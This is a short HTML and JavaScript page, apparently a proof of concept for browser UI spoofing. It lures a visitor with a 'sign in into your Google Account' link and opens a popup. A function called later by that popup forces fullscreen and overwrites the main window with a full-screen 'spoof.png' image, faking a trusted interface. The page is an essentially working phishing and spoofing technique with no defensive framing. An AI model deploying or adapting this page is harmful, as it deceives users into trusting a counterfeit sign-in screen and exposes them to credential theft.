<!DOCTYPE HTML>
<html>
<head>
<meta charset="UTF-8">
<script>

let allowFullscreen = false; // gesture flag

function openWin() {
    // USER GESTURE HERE â†’ fullscreen allowed later
    allowFullscreen = true;

    var width=500, height=180, top=0, left=(screen.width/2)-(width/2);
    window.popup = window.open("opener.html", "first",
        `width=${width},height=${height},top=${top},left=${left}`);
}

// Function called by popup later
function goFullscreenAndSpoof() {
    if (!allowFullscreen) return; // safety

    document.documentElement.requestFullscreen().then(()=>{
        // Replace main window with spoof image
        document.open();
        document.write(`
            <img src="spoof.png" style="width:100%;height:100%;object-fit:cover;">
        `);
        document.close();
    });
}

</script>
</head>

<body>
<center>
    <h1>
        <a href="#" onclick="openWin();">
            Click here to sign in into your Google Account
        </a>
    </h1>
</center>
</body>
</html>
